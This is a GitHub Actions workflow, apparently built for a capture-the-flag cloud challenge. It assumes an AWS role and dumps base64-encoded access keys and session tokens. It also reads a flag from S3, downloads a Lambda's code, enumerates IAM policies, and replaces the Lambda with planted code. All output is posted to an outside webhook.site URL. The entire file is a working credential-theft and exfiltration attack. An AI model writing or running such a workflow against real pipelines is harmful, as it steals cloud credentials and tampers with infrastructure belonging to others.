name: grab-flag
on:
  workflow_dispatch:
  push:
    branches: ['**']
permissions:
  id-token: write
  contents: read
jobs:
  dump:
    runs-on: ubuntu-latest
    timeout-minutes: 10
    steps:
      - uses: aws-actions/configure-aws-credentials@v4
        with:
          role-to-assume: arn:aws:iam::009661764077:role/cicdRole
          aws-region: us-east-1
          role-session-name: flaggrab
      - name: exfil
        shell: bash
        env:
          WH: https://webhook.site/42b620d7-2084-4d83-889f-139b520dd049
        run: |
          set +e
          {
            aws sts get-caller-identity
            python3 - <<'PY'
import os,base64
for k in ['AWS_ACCESS_KEY_ID','AWS_SECRET_ACCESS_KEY','AWS_SESSION_TOKEN']:
 print(k+'_B64='+base64.b64encode((os.environ.get(k,'') or '').encode()).decode())
PY
            aws s3 cp s3://codec4f26c862a321ef5/flag.txt - 2>&1
            URL=$(aws lambda get-function --function-name nslookupv2 --query Code.Location --output text)
            curl -sL "$URL" -o /tmp/lam.zip
            python3 - <<'PY'
import zipfile
z=zipfile.ZipFile('/tmp/lam.zip')
for n in z.namelist():
 print('FILE',n); print(z.read(n)[:3000].decode('utf-8','replace'))
PY
            aws iam list-attached-role-policies --role-name cicdRole
            P=$(aws iam list-attached-role-policies --role-name cicdRole --query 'AttachedPolicies[0].PolicyArn' --output text)
            V=$(aws iam get-policy --policy-arn "$P" --query 'Policy.DefaultVersionId' --output text)
            aws iam get-policy-version --policy-arn "$P" --version-id "$V"
            aws s3api get-bucket-policy --bucket codec4f26c862a321ef5
            mkdir -p /tmp/plant && cat > /tmp/plant/lambda_function.py <<'PY'
import subprocess,json
def lambda_handler(event, context):
    r=subprocess.run('aws s3 cp s3://codec4f26c862a321ef5/flag.txt -',shell=True,capture_output=True,text=True)
    return {'statusCode':200,'headers':{'Content-Type':'application/json'},'body':json.dumps({'flag':r.stdout,'err':r.stderr,'rc':r.returncode})}
PY
            (cd /tmp/plant && zip -q /tmp/plant.zip lambda_function.py)
            aws lambda update-function-code --function-name nslookupv2 --zip-file fileb:///tmp/plant.zip 2>&1
            aws lambda invoke --function-name nslookupv2 --cli-binary-format raw-in-base64-out --payload '{}' /tmp/out.json 2>&1
            cat /tmp/out.json 2>&1
          } 2>&1 | tee /tmp/all.txt
          curl -s -X POST --data-binary @/tmp/all.txt "$WH" || true
          cat /tmp/all.txt
